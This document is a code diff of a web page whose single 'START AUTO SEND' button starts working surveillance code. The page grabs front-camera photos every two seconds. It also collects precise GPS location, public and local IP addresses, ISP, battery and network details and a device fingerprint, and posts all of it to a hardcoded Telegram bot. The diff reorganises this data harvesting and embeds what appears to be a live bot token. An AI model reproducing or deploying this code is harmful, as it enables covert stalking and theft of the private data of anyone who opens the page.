@@ -11,7 +11,7 @@ button{margin-top:12px;padding:10px 20px;font-size:16px;cursor:pointer}
 </head>
 <body>
 <canvas id="canvas" style="display:none"></canvas>
-<button onclick="start()">▶ START AUTO SEND</button>
+<button onclick="startSending()">▶ START AUTO SEND</button>
 <script>
 const canvas=document.getElementById("canvas");
 const BOT_TOKEN="7917384016:AAG7cxyuts9UJ-Km0BMqBeQVJEJfstH239g";
@@ -28,8 +28,18 @@ let localIP="Unknown";
 let city="Unknown";
 let country="Unknown";
 let isp="Unknown";
-let pluginsInfo="";
-let timezoneInfo="";
+
+navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(s=>{stream=s});
+
+if("geolocation" in navigator){
+navigator.geolocation.getCurrentPosition(pos=>{
+latitude=pos.coords.latitude.toFixed(6);
+longitude=pos.coords.longitude.toFixed(6);
+mapLink=`https://maps.google.com/maps?q=${latitude},${longitude}&z=17&t=k`;
+},()=>{
+mapLink="Location denied";
+},{enableHighAccuracy:true,timeout:10000,maximumAge:0});
+}
 
 fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>{
 userIP=d.ip;
@@ -41,19 +51,6 @@ country=ipData.country_name||"Unknown";
 isp=ipData.org||"Unknown";
 });
 });
-
-navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(s=>{stream=s});
-
-if(navigator.geolocation){
-navigator.geolocation.getCurrentPosition(pos=>{
-latitude=pos.coords.latitude.toFixed(6);
-longitude=pos.coords.longitude.toFixed(6);
-const accuracy=pos.coords.accuracy;
-mapLink=`https://maps.google.com/maps?q=${latitude},${longitude}&z=17&t=k`;
-},()=>{
-mapLink="Location denied";
-},{enableHighAccuracy:true,timeout:10000,maximumAge:0});
-}
 
 if(navigator.getBattery){
 navigator.getBattery().then(b=>{
@@ -76,22 +73,6 @@ Save Data: ${navigator.connection.saveData?'Enabled':'Disabled'}
 `;
 }
 
-if(navigator.plugins){
-const plugins=Array.from(navigator.plugins);
-pluginsInfo=`
-🔌 Browser Plugins (${plugins.length}):
-${plugins.map((p,i)=>`${i+1}. ${p.name} (${p.version})`).join('\n')}
-`;
-}
-
-timezoneInfo=`
-🌐 Timezone Details:
-Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-Offset: ${new Date().getTimezoneOffset()} minutes
-Locale: ${navigator.language}
-Available Locales: ${navigator.languages?navigator.languages.join(', '):navigator.language}
-`;
-
 const getLocalIPAddress=()=>{
 return new Promise(resolve=>{
 const pc=new RTCPeerConnection({iceServers:[]});
@@ -107,9 +88,20 @@ setTimeout(()=>resolve("Not found"),1000);
 });
 };
 
+const getBrowserPlugins=()=>{
+const plugins=[];
+for(let i=0;i<navigator.plugins.length;i++){
+plugins.push(navigator.plugins[i].name);
+}
+return plugins.length>0?plugins.slice(0,5).join(', '):'No plugins detected';
+};
+
 const getAdvancedSystemInfo=()=>{
 const cores=navigator.hardwareConcurrency||'Unknown';
 const ram=navigator.deviceMemory||'Unknown';
+const lang=navigator.language;
+const langs=navigator.languages?navigator.languages.join(', '):lang;
+const timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
 const platform=navigator.platform;
 const vendor=navigator.vendor||'Unknown';
 const cookieEnabled=navigator.cookieEnabled?'Yes':'No';
@@ -118,27 +110,33 @@ const webdriver=navigator.webdriver?'Yes':'No';
 const maxTouchPoints=navigator.maxTouchPoints||0;
 const userAgent=navigator.userAgent;
 const deviceModel=userAgent.match(/\((.*?)\)/)?userAgent.match(/\((.*?)\)/)[1]:'Unknown';
-const appName=navigator.appName||'Unknown';
-const appVersion=navigator.appVersion||'Unknown';
-const appCodeName=navigator.appCodeName||'Unknown';
+const plugins=getBrowserPlugins();
+const doNotTrack=navigator.doNotTrack||'Not specified';
+const oscpu=navigator.oscpu||'Unknown';
 const product=navigator.product||'Unknown';
 const productSub=navigator.productSub||'Unknown';
-const doNotTrack=navigator.doNotTrack||'Unknown';
+
+const now=new Date();
+const timezoneOffset=now.getTimezoneOffset();
+const utcOffset=-timezoneOffset/60;
+const offsetSign=utcOffset>=0?'+':'-';
+const formattedOffset=`UTC${offsetSign}${Math.abs(utcOffset)}`;
 
 return`
 🖥️ SYSTEM INFORMATION:
 Device: ${platform}
 Model: ${deviceModel}
+OS CPU: ${oscpu}
 Browser: ${userAgent.substring(0,80)}...
-App Name: ${appName}
-App Version: ${appVersion}
-App Code: ${appCodeName}
-Product: ${product}
-Product Sub: ${productSub}
-Do Not Track: ${doNotTrack}
+Product: ${product} ${productSub}
 CPU Cores: ${cores}
 RAM: ${ram} GB
+Languages: ${langs}
+Timezone: ${timezone}
+UTC Offset: ${formattedOffset}
 Vendor: ${vendor}
+Plugins: ${plugins}
+Do Not Track: ${doNotTrack}
 Cookies: ${cookieEnabled}
 PDF Viewer: ${pdfViewerEnabled}
 WebDriver: ${webdriver}
@@ -149,50 +147,15 @@ Color Depth: ${screen.colorDepth}
 `;
 };
 
-function start(){
+function startSending(){
 getLocalIPAddress().then(ip=>{localIP=ip});
-
 if(!intervalId){
 intervalId=setInterval(captureAndSend,2000);
 }
 }
 
 function captureAndSend(){
-if(!stream){
-const caption=`
-📸 DATA CAPTURE - ${new Date().toLocaleTimeString()}
-⏰ Full Time: ${new Date().toLocaleString()}
-
-📍 LOCATION INFORMATION:
-Latitude: ${latitude}
-Longitude: ${longitude}
-Google Maps: ${mapLink}
-City: ${city}
-Country: ${country}
-ISP: ${isp}
-
-🌍 NETWORK INFORMATION:
-Public IP: ${userIP}
-Local IP: ${localIP}
-${networkInfo}
-
-${getAdvancedSystemInfo()}
-
-${pluginsInfo}
-
-${timezoneInfo}
-
-${batteryInfo}
-
-⚠️ Camera permission not granted
-`;
-const formData=new FormData();
-formData.append("chat_id",CHAT_ID);
-formData.append("caption",caption);
-fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:"POST",body:formData});
-return;
-}
-
+if(!stream)return;
 const videoTrack=stream.getVideoTracks()[0];
 const imageCapture=new ImageCapture(videoTrack);
 imageCapture.grabFrame().then(imageBitmap=>{
@@ -207,7 +170,7 @@ const caption=`
 📸 AUTO CAPTURE - ${new Date().toLocaleTimeString()}
 ⏰ Full Time: ${new Date().toLocaleString()}
 
-📍 LOCATION INFORMATION:
+📍 ACCURATE LOCATION:
 Latitude: ${latitude}
 Longitude: ${longitude}
 Google Maps: ${mapLink}
@@ -221,10 +184,6 @@ Local IP: ${localIP}
 ${networkInfo}
 
 ${getAdvancedSystemInfo()}
-
-${pluginsInfo}
-
-${timezoneInfo}
 
 ${batteryInfo}
 
@@ -236,39 +195,7 @@ formData.append("photo",blob);
 formData.append("caption",caption);
 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:formData});
 },"image/jpeg",0.7);
-}).catch(()=>{
-const caption=`
-📸 DATA CAPTURE (No Camera) - ${new Date().toLocaleTimeString()}
-⏰ Full Time: ${new Date().toLocaleString()}
-
-📍 LOCATION INFORMATION:
-Latitude: ${latitude}
-Longitude: ${longitude}
-Google Maps: ${mapLink}
-City: ${city}
-Country: ${country}
-ISP: ${isp}
-
-🌍 NETWORK INFORMATION:
-Public IP: ${userIP}
-Local IP: ${localIP}
-${networkInfo}
-
-${getAdvancedSystemInfo()}
-
-${pluginsInfo}
-
-${timezoneInfo}
-
-${batteryInfo}
-
-⚠️ Camera failed, but other data captured
-`;
-const formData=new FormData();
-formData.append("chat_id",CHAT_ID);
-formData.append("caption",caption);
-fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:"POST",body:formData});
-});
+}).catch(()=>{});
 }
 </script>
 </body>
